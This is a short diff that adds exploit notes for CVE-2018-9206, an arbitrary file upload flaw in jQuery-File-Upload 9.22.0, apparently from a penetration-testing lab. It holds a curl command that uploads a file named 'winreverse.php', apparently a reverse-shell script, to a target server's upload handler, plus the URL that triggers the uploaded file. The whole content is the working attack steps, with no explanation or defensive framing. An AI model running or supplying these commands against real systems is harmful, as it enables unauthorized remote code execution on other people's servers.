@@ -1,0 +1,5 @@
+jQuery-File-Upload 9.22.0 - Arbitrary File Upload CVE-2018-9206
+
+curl -F "files=@winreverse.php" http://10.11.1.123/books/apps/jquery-file-upload/server/php/index.php
+
+http://10.11.1.123/books/apps/jquery-file-upload/server/php/files/winreverse.php
